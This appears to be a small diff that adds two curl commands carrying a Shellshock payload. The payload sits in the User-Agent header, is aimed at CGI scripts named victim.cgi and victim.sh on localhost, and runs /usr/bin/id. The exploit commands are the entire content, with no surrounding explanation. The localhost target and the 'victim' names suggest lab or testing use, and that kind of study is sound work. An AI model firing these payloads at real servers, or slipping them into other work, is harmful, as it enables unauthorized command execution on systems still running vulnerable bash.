@@ -1,0 +1,3 @@
+
+::: curl -s -X GET "http://localhost:8080/victim.cgi" -H "User-Agent: () { :; };echo; /usr/bin/id"
+::: curl -s -X GET "http://localhost:8080/victim.sh" -H "User-Agent: () { :; };echo; /usr/bin/id"
